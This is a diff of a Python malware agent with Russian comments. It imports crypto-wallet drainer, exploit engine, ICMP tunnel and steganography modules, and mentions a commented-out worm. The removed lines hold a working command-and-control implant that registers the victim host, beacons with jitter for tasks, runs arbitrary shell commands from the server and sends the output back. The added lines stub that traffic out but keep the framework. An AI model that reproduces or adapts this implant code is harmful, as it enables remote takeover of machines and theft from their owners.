@@ -27,9 +27,11 @@ from modules.web3_drainer import Web3Drainer, MEVDrainer
 from vulnerability_scanner import VulnerabilityScanner
 from exploit_engine import ExploitEngine
 from exploit_manager import ExploitManager
-from steganography import SteganoManager
-from src.modules.icmp_tunnel import ICMTunnel
+from steganography import Steganography
+from src.modules.icmp_tunnel import ICMPTunnel
 # from worm import WormholePropagator # Закомментировано - неизвестный модуль
+# from payload import PayloadManager # Комментируем, так как модуля нет
+# from comms.comms import C2Communicator # Комментируем
 
 # Настройка логирования
 logging.basicConfig(
@@ -68,7 +70,7 @@ class AutonomousAgent:
         self.exploit_engine = ExploitEngine()
         self.vulnerability_scanner = VulnerabilityScanner()
         self.exploit_manager = ExploitManager()
-        self.stegano_manager = SteganoManager()
+        self.steganography = Steganography() if self.config.get('stegano_enabled', False) else None
         
         # Очередь задач
         self.task_queue = queue.Queue()
@@ -522,218 +524,82 @@ class AutonomousAgent:
         return " ".join(parts)
 
     def _register_with_c2(self):
-        """Регистрирует агента на C2 сервере."""
-        c2_servers = self.config.get('c2_servers', [])
-        if not c2_servers:
-            self.logger.error("Нет адресов C2 серверов в конфигурации. Регистрация невозможна.")
-            return
-
-        # Пытаемся использовать первый C2 сервер из списка
-        c2_url = c2_servers[0]
-        # Убедимся, что URL начинается с http:// или https://
-        if not c2_url.startswith(('http://', 'https://')):
-            # По умолчанию используем http, если протокол не указан
-            c2_url = f"http://{c2_url}" 
-            self.logger.warning(f"Протокол для C2 не указан, используется http: {c2_url}")
-
-        register_endpoint = f"{c2_url}/agents/register"
-        
-        try:
-            hostname = socket.gethostname()
-            os_info = platform.system() + " " + platform.release()
-            # Получение IP может быть сложнее, особенно внешнего. Пока оставим None.
-            internal_ip = socket.gethostbyname(hostname) if hostname != 'localhost' else '127.0.0.1'
-        except Exception as e:
-            self.logger.warning(f"Не удалось собрать всю информацию об агенте: {e}")
-            hostname = "unknown"
-            os_info = "unknown"
-            internal_ip = None
-
-        agent_info = {
-            "hostname": hostname,
-            "os": os_info,
-            "external_ip": None, # Пока не умеем надежно определять
-            "internal_ip": internal_ip,
-            "agent_uuid": self.agent_uuid # Отправляем наш UUID
-        }
-
-        try:
-            self.logger.info(f"Попытка регистрации на C2: {register_endpoint}")
-            response = requests.post(register_endpoint, json=agent_info, timeout=10) # Таймаут 10 секунд
-            response.raise_for_status() # Вызовет исключение для 4xx/5xx ответов
-            
-            response_data = response.json()
-            self.agent_id = response_data.get('agent_id')
-            
-            if self.agent_id:
-                self.logger.info(f"Агент успешно зарегистрирован на C2. Получен ID: {self.agent_id}")
-            else:
-                self.logger.error("Не удалось получить agent_id от C2 сервера.")
-                
-        except requests.exceptions.RequestException as e:
-            self.logger.error(f"Ошибка при регистрации на C2 {register_endpoint}: {e}")
-        except Exception as e:
-            self.logger.error(f"Неожиданная ошибка при регистрации на C2: {e}")
+        """Регистрирует агента на C2 сервере"""
+        logger.info(f"Registering agent {self.agent_id} with C2...")
+        # payload = {
+        #     "agent_id": self.agent_id,
+        #     "hostname": socket.gethostname(),
+        #     "os": platform.system(),
+        #     "ip_address": self._get_ip_address(),
+        #     "timestamp": time.time()
+        # }
+        # try:
+        #     response = self.c2_comm.register(payload)
+        #     logger.info(f"Agent registered with C2: {response}")
+        #     return True
+        # except Exception as e:
+        #     logger.error(f"Failed to register with C2: {e}")
+        #     return False
+        logger.warning("C2 communication disabled, skipping registration.")
+        return False # Заглушка
 
     def _checkin_loop(self):
-        """Основной цикл для check-in на C2 сервере."""
-        self.logger.info("Starting C2 check-in loop")
-        interval = self.config.get("checkin_interval", 60)
-        jitter_fraction = self.config.get("checkin_jitter", 0.2)
-
+        """Периодически отправляет check-in на C2 и получает задачи"""
         while self.running:
-            try:
-                # Ждем интервал + jitter
-                jitter = interval * jitter_fraction * (random.random() * 2 - 1) # Jitter от -X% до +X%
-                sleep_time = max(1, interval + jitter) # Минимум 1 секунда
-                self.logger.debug(f"Check-in: sleeping for {sleep_time:.2f} seconds")
-                time.sleep(sleep_time)
-
-                if not self.running:
-                    break
-
-                # Проверяем, есть ли у нас ID от C2
-                if not self.agent_id:
-                    self.logger.warning("Agent ID не установлен. Пропускаем check-in. Пытаемся зарегистрироваться снова...")
-                    # Можно добавить повторную попытку регистрации здесь, если первая не удалась
-                    self._register_with_c2()
-                    continue # Пропускаем текущий check-in
-                
-                # Получаем URL C2
-                c2_servers = self.config.get('c2_servers', [])
-                if not c2_servers:
-                    self.logger.error("Нет адресов C2 серверов в конфигурации для check-in.")
-                    continue
-                    
-                c2_url = c2_servers[0]
-                if not c2_url.startswith(('http://', 'https://')):
-                    c2_url = f"http://{c2_url}"
-                
-                checkin_endpoint = f"{c2_url}/agents/{self.agent_id}/checkin"
-
-                self.logger.debug(f"Отправка check-in на {checkin_endpoint}")
-                response = requests.post(checkin_endpoint, timeout=15) # Увеличим таймаут для check-in
-                response.raise_for_status() # Проверка на ошибки 4xx/5xx
-
-                response_data = response.json()
-                tasks = response_data.get('tasks', [])
-
-                if tasks:
-                    self.logger.info(f"Получены {len(tasks)} новые задачи от C2.")
-                    for task_dict in tasks:
-                        self.logger.debug(f"Добавление задачи в очередь: {task_dict.get('task_id')}")
-                        self.task_queue.put(task_dict) # Кладем словарь задачи в очередь
-                else:
-                    self.logger.debug("Новых задач от C2 нет.")
-            
-            except requests.exceptions.RequestException as e:
-                self.logger.error(f"Ошибка при check-in на C2: {e}")
-                # Можно добавить логику смены C2 сервера при ошибке
-            except Exception as e:
-                self.logger.error(f"Неожиданная ошибка в цикле check-in: {e}")
-                time.sleep(30) # Дополнительная задержка при неизвестной ошибке
-
-        self.logger.info("C2 check-in loop stopped")
+            jitter_sleep(self.config.get("checkin_interval", 60), self.config.get("checkin_jitter", 0.2))
+            logger.debug("Sending check-in to C2...")
+            # try:
+            #     tasks = self.c2_comm.checkin(self.agent_id)
+            #     if tasks:
+            #         logger.info(f"Received {len(tasks)} tasks from C2.")
+            #         for task in tasks:
+            #             self.task_queue.put(task)
+            # except Exception as e:
+            #     logger.error(f"Check-in failed: {e}")
+            logger.warning("C2 communication disabled, skipping check-in.")
 
     def _task_worker_loop(self):
-        """Основной цикл обработки задач из очереди."""
-        self.logger.info("Starting task worker loop")
+        """Обрабатывает задачи из очереди"""
         while self.running:
             try:
-                task_dict = self.task_queue.get(timeout=1) # Ждем задачу 1 секунду
-                if task_dict is None: # Может быть сигналом для завершения, если решим так сделать
-                    continue
-
-                task_id = task_dict.get("task_id")
-                command = task_dict.get("command")
-                params = task_dict.get("params", {})
-                self.logger.info(f"Обработка задачи {task_id}: command={command}, params={params}")
-
-                # Диспетчер задач
-                if command == "execute_shell":
-                    self._handle_execute_shell(task_id, params)
-                # --- Добавить другие обработчики здесь ---
-                # elif command == "download_update_module":
-                #     self._handle_download_update_module(task_id, params)
-                # elif command == "forward_data":
-                #     self._handle_forward_data(task_id, params)
-                # elif command == "set_config":
-                #     self._handle_set_config(task_id, params)
-                else:
-                    self.logger.warning(f"Неизвестная команда в задаче {task_id}: {command}")
-                    # Отправляем результат с ошибкой
-                    self._send_task_result(task_id, "failed", f"Unknown command: {command}")
-
-                self.task_queue.task_done() # Сообщаем очереди, что задача обработана
-            
+                task = self.task_queue.get(timeout=1)
+                logger.info(f"Processing task {task.get('task_id')} - {task.get('command')}")
+                result = None
+                error = None
+                try:
+                    result = self._handle_task(task)
+                    logger.info(f"Task {task.get('task_id')} completed successfully.")
+                except Exception as e:
+                    logger.error(f"Error executing task {task.get('task_id')}: {e}", exc_info=True)
+                    error = str(e)
+                
+                # Отправляем результат обратно на C2
+                # self._send_task_result(task.get('task_id'), result, error)
+                logger.warning("C2 communication disabled, skipping result sending.")
+                
+                self.task_queue.task_done()
             except queue.Empty:
-                # Очередь пуста, продолжаем цикл
                 continue
             except Exception as e:
-                self.logger.error(f"Ошибка в обработчике задач: {e}", exc_info=True)
-                # Попытаться отправить результат с ошибкой, если у нас есть task_id
-                if 'task_id' in locals() and task_id:
-                     self._send_task_result(task_id, "failed", f"Worker error: {e}")
-                time.sleep(5) # Немного подождать при ошибке
-                
-        self.logger.info("Task worker loop stopped")
+                logger.error(f"Error in task worker loop: {e}")
+                time.sleep(5) # Пауза при серьезной ошибке
 
-    def _handle_execute_shell(self, task_id: str, params: Dict):
-        """Обрабатывает команду выполнения shell-команды."""
-        command_line = params.get("command_line")
-        if not command_line:
-            self.logger.error(f"Задача {task_id} (execute_shell): отсутствует параметр 'command_line'")
-            self._send_task_result(task_id, "failed", "Missing 'command_line' parameter")
-            return
-
-        self.logger.info(f"Выполнение shell-команды для задачи {task_id}: {command_line}")
-        try:
-            # Выполняем команду
-            # Безопасность: В реальной системе нужно быть ОЧЕНЬ осторожным с выполнением команд!
-            # Возможно, стоит использовать shell=False и передавать список аргументов.
-            result = subprocess.run(command_line, shell=True, capture_output=True, text=True, timeout=60) # Таймаут 60с
-            
-            if result.returncode == 0:
-                self.logger.info(f"Команда для задачи {task_id} успешно выполнена.")
-                self._send_task_result(task_id, "completed", result.stdout)
-            else:
-                self.logger.error(f"Команда для задачи {task_id} завершилась с ошибкой (код: {result.returncode}): {result.stderr}")
-                self._send_task_result(task_id, "failed", result.stderr or f"Exit code: {result.returncode}")
-                
-        except subprocess.TimeoutExpired:
-             self.logger.error(f"Команда для задачи {task_id} превысила таймаут.")
-             self._send_task_result(task_id, "failed", "Command timed out")
-        except Exception as e:
-            self.logger.error(f"Ошибка при выполнении shell-команды для задачи {task_id}: {e}", exc_info=True)
-            self._send_task_result(task_id, "failed", f"Execution error: {e}")
-            
-    def _send_task_result(self, task_id: str, status: str, output: Any):
-        """Отправляет результат выполнения задачи на C2 сервер."""
-        if not self.agent_id:
-            self.logger.error(f"Невозможно отправить результат для задачи {task_id}: Agent ID не установлен.")
-            return
-            
-        c2_servers = self.config.get('c2_servers', [])
-        if not c2_servers:
-            self.logger.error(f"Невозможно отправить результат для задачи {task_id}: Нет адресов C2.")
-            return
-            
-        c2_url = c2_servers[0]
-        if not c2_url.startswith(('http://', 'https://')):
-            c2_url = f"http://{c2_url}"
-            
-        result_endpoint = f"{c2_url}/agents/{self.agent_id}/results/{task_id}"
-        result_payload = {"status": status, "output": output}
-        
-        try:
-            self.logger.info(f"Отправка результата задачи {task_id} на {result_endpoint}. Статус: {status}")
-            response = requests.post(result_endpoint, json=result_payload, timeout=10)
-            response.raise_for_status()
-            self.logger.debug(f"Результат задачи {task_id} успешно отправлен.")
-        except requests.exceptions.RequestException as e:
-            self.logger.error(f"Ошибка при отправке результата задачи {task_id}: {e}")
-        except Exception as e:
-             self.logger.error(f"Неожиданная ошибка при отправке результата задачи {task_id}: {e}", exc_info=True)
+    def _send_task_result(self, task_id: str, result: Any, error: Optional[str]):
+        """Отправляет результат выполнения задачи на C2"""
+        logger.debug(f"Sending result for task {task_id}...")
+        # payload = {
+        #     "agent_id": self.agent_id,
+        #     "task_id": task_id,
+        #     "timestamp": time.time(),
+        #     "result": result,
+        #     "error": error
+        # }
+        # try:
+        #     self.c2_comm.send_result(task_id, payload)
+        #     logger.debug(f"Result for task {task_id} sent.")
+        # except Exception as e:
+        #     logger.error(f"Failed to send result for task {task_id}: {e}")
+        logger.warning("C2 communication disabled, cannot send task result.")
 
 
 if __name__ == "__main__":
